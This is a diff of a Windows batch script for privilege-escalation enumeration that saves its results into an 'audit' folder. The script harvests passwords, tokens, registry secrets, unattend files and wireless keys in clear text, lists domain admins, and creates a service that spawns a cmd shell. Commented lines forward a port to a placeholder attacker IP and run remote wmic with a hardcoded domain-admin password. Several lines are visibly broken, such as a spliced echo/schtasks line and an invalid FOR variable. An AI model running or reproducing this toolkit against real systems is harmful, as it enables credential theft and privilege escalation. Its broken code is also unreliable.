@@ -1,3 +1,5 @@
+@echo off
+
 REM Author: Gilles Biagomba
 REM Program: wind0z_Pr1v3sc.bat
 REM Description: This script is designed to perform windows checks for privilege escalation
@@ -7,10 +9,12 @@ REM https://hackmag.com/security/elevating-privileges-to-administrative-and-furt
 REM https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/Windows_AD_commands.md
 REM http://pwnwiki.io/#!privesc/windows/uac.md
 
-@echo off
+REM Setting up work directory
+echo "Setting up work directory"
+mkdir %HOMEPATH%\Donwloads\%computername%-SAS_Audit\
 
 REM downloading dependencies
-cd %HOMEPATH%/Donwloads/
+echo "REM downloading dependencies"
 bitsadmin /transfer n "https://download.sysinternals.com/files/PSTools.zip"
 REM bitsadmin /transfer n "https://github.com/silentsignal/wpc/archive/refs/heads/wpc-2.0.zip"
 REM bitsadmin /transfer n "https://github.com/pentestmonkey/windows-privesc-check/archive/refs/heads/master.zip"
@@ -21,219 +25,209 @@ echo
 
 REM Basics
 echo "Basic Enumeration of the System"
-systeminfo
-hostname
+systeminfo >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_systeminfo.txt
+hostname >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_systeminfo.txt
 echo
 
 REM Who am I?
 echo "Obtainting whoami"
-whoami
-echo %username%
+whoami >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_whoami.txt
+echo %username% >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_whoami.txt
 echo
 
 REM What users/localgroups are on the machine?
 echo "What users/localgroups are on the machine?"
-net users
-net localgroups
+net users >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
+net localgroup >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
+net group /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_usr-grp.txt
 echo
 
-REM More info about a specific user. Check if user has privileges.
-REM net user user1
-
-REM View Domain Groups
-echo "View Domain Groups"
-net group /domain
-echo
-
-REM View Members of Domain Group
-REM net group /domain <Group Name>
+REM Pulls list of running services off the machine
+echo Gathering list of services on the machine...3/8
+net start >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_Services.txt
 
 REM Additional net comments
 echo "Running additional net commands"
-net view
-net view /domain
-net view /domain:Cable
-net view \\domain-control
-net user
-net user /domain
-net localgroup administrators
-net localgroup administrators /domain
-net group /domain
-net group "Domain Admins" /domain
-net group "Domain Computers" /domain
-net group "Domain Controllers" /domain
-net group "Group Policy Creator Owners" /domain
-net time /domain
-net config
-net session
-net use \\ip\ipc$ password /user:username
-net share
-net accounts /domain
+net view >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net view /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net view /domain:Cable >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net view \\domain-control >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net user >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net user /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net localgroup administrators >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net localgroup administrators /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net group /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net group "Domain Admins" /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net group "Domain Computers" /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net group "Domain Controllers" /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net group "Group Policy Creator Owners" /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net time /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net config >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net session >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net use \\ip\ipc$ password /user:Administrator >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net share >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
+net accounts /domain >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_net-cmd.txt
 echo
 
 REM Network
 echo "Basic network info"
-ipconfig /all
-ipconfig /displaydns
-route print
-arp -A
+ipconfig /all >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network.txt
+ipconfig /displaydns >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network.txt
+route print >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network.txt
+arp -A >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network.txt
 echo
 
 REM Show connections
 echo "Showing Connections"
-netstat -ano
-netstat -ano -p tcp
-netstat -ano -p udp
+netstat -ano >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-connections.txt
+netstat -ano -p tcp >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-connections.txt
+netstat -ano -p udp >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-connections.txt
 echo
 
 REM Firewall
 echo "Showing firewall information"
-netsh firewall show state
-netsh firewall show config
+netsh firewall show state >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-firewall.txt
+netsh firewall show config >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-firewall.txt
 echo
 
 REM more fw & networking
 echo "Showing more firewall & network info"
-netsh firewall show conf
-netsh firewall set service type = remotedesktop mode = enable
-netsh firewall add allowedprogram C:\nltest.exe mltest enable
-netsh firewall add portopening tcp 2482 lt enable all
-netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80
-netsh wlan show profiles
-netsh wlan export profile folder=. key=clear
-netsh wlan set hostednetwork mode=[allow\|disallow]
-netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
-netsh wlan [start|stop] hostednetwork
+netsh firewall show conf >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-firewall.txt
+REM netsh firewall set service type = remotedesktop mode = enable
+REM netsh firewall add allowedprogram C:\nltest.exe mltest enable
+REM netsh firewall add portopening tcp 2482 lt enable all
+REM netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80
+netsh wlan show profiles >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-wireless.txt
+netsh wlan export profile folder=. key=clear >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_network-wireless.txt
+REM netsh wlan set hostednetwork mode=[allow\|disallow]
+REM netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
+REM netsh wlan [start|stop] hostednetwork
 echo
 
 REM How well patched is the system?
 echo "How well patched is the system"
-wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic qfe get Caption,Description,HotFixID,InstalledOn >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_Installed_Patches.txt
 echo
 
 REM using more vmic commands
 echo "Using more vmic commands"
-wmic useraccount
-wmic useraccount LIST FULL
-wmic useraccount LIST BRIEF
-wmic useraccount LIST STATUS
-wmic startup
-wmic share
-wmic service
-wmic process where name="[PROCESS]" call terminate
-wmic process where ProcessId="[PID]" call terminate
-wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"
-wmic qfe get hotfixid
-wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
-wmic bios
-wmic bios LIST FULL
-wmic volume LIST BRIE
+REM wmic useraccount
+REM wmic useraccount LIST FULL
+REM wmic useraccount LIST BRIEF
+REM wmic useraccount LIST STATUS
+REM wmic startup
+REM wmic share
+REM wmic service
+REM wmic process where name="[PROCESS]" call terminate
+REM wmic process where ProcessId="[PID]" call terminate
+REM wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"
+REM wmic qfe get hotfixid
+REM wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
+REM wmic bios
+REM wmic bios LIST FULL
+REM wmic volume LIST BRIE
 echo
 
 REM Shows information about processes locally
 echo "Shows information about processes locally "
-qprocess * /SERVER:%COMPUTERNAME%
+qprocess * /SERVER:%COMPUTERNAME% >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_local_processes.txt
 echo
 
 REM Searching scheduled Tasks
 echo "Searching scheduled Tasks"
-tasklist /V
-tasklist /M
-tasklist /FI "IMAGENAME eq cmd.exe"
-tasklist /FI "PID eq 4060"
+tasklist /V >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
+tasklist /M >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
+tasklist /FI "IMAGENAME eq cmd.exe" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
+tasklist /FI "PID eq 4060" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
+schtasks /query /fo LIST /v  >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_scheduled_tasks.txt
 echo
 
 REM Search for them
 echo "Cleartext Passwords"
-findstr /si password *.txt
-findstr /si password *.xml
-findstr /si password *.ini
+cd C:\
+findstr /si password *.txt >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+findstr /si password *.xml >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+findstr /si password *.ini >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
 echo
 
 REM Find all those strings in config files.
 echo "Find all those strings in config files"
-dir /s *pass* == *cred* == *vnc* == *.config*
+dir /s *pass* == *cred* == *vnc* == *.config* >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
 echo
 
 REM Find all passwords in all files.
 echo "Find all passwords in all files"
-findstr /spin "password" *.*
-findstr /spin "password" *.*
+findstr /spin "password" *.* >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+findstr /spin "password" *.* >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
 echo
 
 REM More passwords In files
 echo "More passwords In files"
-type c:\sysprep.inf
-type c:\sysprep\sysprep.xml
-type c:\unattend.xml
-type %WINDIR%\Panther\Unattend\Unattended.xml
-type %WINDIR%\Panther\Unattended.xml
-dir c:\*vnc.ini /s /b
-dir c:\*ultravnc.ini /s /b
-dir c:\ /s /b | findstr /si *vnc.ini
+type c:\sysprep.inf >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+type c:\sysprep\sysprep.xml >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+type c:\unattend.xml >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+type %WINDIR%\Panther\Unattend\Unattended.xml >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+type %WINDIR%\Panther\Unattended.xml >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+dir c:\*vnc.ini /s /b >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+dir c:\*ultravnc.ini /s /b >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+dir c:\ /s /b | findstr /si *vnc.ini >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
 echo
 
 REM VNC
-echo "Quering the registry - VNC"
-reg query "HKCU\Software\ORL\WinVNC3\Password"
+echo "Querying the registry - VNC"
+reg query "HKCU\Software\ORL\WinVNC3\Password" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_vnc_passwords.txt
 echo
 
 REM Windows autologin
-echo "Quering the registry - autologin"
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+echo "Querying the registry - autologin"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_autologon.txt
 echo
 
-REM SNMP Paramters
-echo "Quering the registry - SNMP"
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+REM SNMP Parameters
+echo "Querying the registry - SNMP"
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_snmp.txt
 echo
 
 REM Putty
-echo "Quering the registry - PuTTY"
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+echo "Querying the registry - PuTTY"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_putty.txt
 echo
 
 REM AlwaysInstallElevated
-echo "Quering the registry - AlwaysInstallElevated"
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+echo "Querying the registry - AlwaysInstallElevated"
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_AlwaysInstallElevated.txt
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_AlwaysInstallElevated.txt
 echo
 
 REM Search for password in registry
-echo "Quering the registry - Passwords"
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
+echo "Querying the registry - Passwords"
+FOR %%s_name IN  api ari aws bearer crypt key pass secret token ey DO (
+ reg query HKLM /f  %%s_name /t REG_SZ /s >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+ reg query HKCU /f  %%s_name /t REG_SZ /s >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cleartext_passwords.txt
+)
 echo
 
 REM Service only available from inside
 echo "Service only available from inside"
-netstat -ano
-echo
-
-REM Scheduled Tasks
-echo "Scheduled Tasks"
-schtasks /query /fo LIST /v
+netstat -ano >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_services.txt
 echo
 
 REM Weak Service Permissions
 echo "Weak Service Permissions"
 wmic service list brief
-for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
-for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %aschtasks /query /fo LIST /v  >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_permissions.txt
+for /f eol^=^"^ delims^=^" %a in (%HOMEPATH%/Donwloads/%computername%-SAS_Audit/%computername%_permissions.txt) do cmd.exe /c icacls "%a" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_weak_permissions.txt
 echo
 
 REM sc.exe
 echo "Using the service controller"
-sc query
-sc qc service name
-sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
-FOR /F %i in (Servicenames.txt) DO echo %i
-FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
-FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
-sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys
-type Servicenames.txt
-type services.txt
-type path.txt
+sc query >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_service-controller.txt
+sc qc service name >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_service-controller.txt
+sc query state= all | findstr "SERVICE_NAME:" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_Servicenames.txt
+FOR /F %i in (%HOMEPATH%/Donwloads/%computername%-SAS_Audit/%computername%_Servicenames.txt) DO echo %i
+FOR /F "tokens=2 delims= " %i in (%HOMEPATH%/Donwloads/%computername%-SAS_Audit/%computername%_Servicenames.txt) DO @echo %i >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_services.txt
+FOR /F %i in (%HOMEPATH%/Donwloads/%computername%-SAS_Audit/%computername%_services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_path.txt
+sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_cmdsys.txt
 echo
 
 REM Migrate the meterpreter shell
@@ -248,11 +242,11 @@ echo
 
 REM How to search such directories/ files
 echo "search such directories/ files"
-accesschk.exe -uwdqs users c:\
-accesschk.exe -uwdqs “Authenticated Users” c:\
-accesschk.exe -uwqs users c:\*.*
-accesschk.exe -uwqs “Authenticated Users” c:\*.*
-accesschk.exe –uwcqv *
+accesschk.exe -uwdqs users c:\ >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_search-dir.txt
+accesschk.exe -uwdqs “Authenticated Users” c:\ >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_search-dir.txt
+accesschk.exe -uwqs users c:\*.* >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_search-dir.txt
+accesschk.exe -uwqs “Authenticated Users” c:\*.* >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_search-dir.txt
+accesschk.exe –uwcqv * >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_search-dir.txt
 echo
 
 REM Ssearch for process Permissions
@@ -266,12 +260,12 @@ echo
 
 REM List all drivers
 echo "Vulnerable Drivers"
-driverquery
+driverquery >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_vulnerable_drivers.txt
 echo
 
 REM Lost auto launch
-echo "Lost auto launch"
-autorunsc.exe -a | findstr /n /R "File\ not\ found"
+REM echo "Lost auto launch"
+REM autorunsc.exe -a | findstr /n /R "File\ not\ found"
 echo
 
 REM Using PsTools
@@ -286,4 +280,4 @@ echo
 
 REM PUlling GPO
 echo ": Extremely verbose output of GPO (Group policy) settings as applied to the current system and user"
-gpresult /z
+gpresult /z >> %HOMEPATH%\Donwloads\%computername%-SAS_Audit\%computername%_gpo_policy.txt
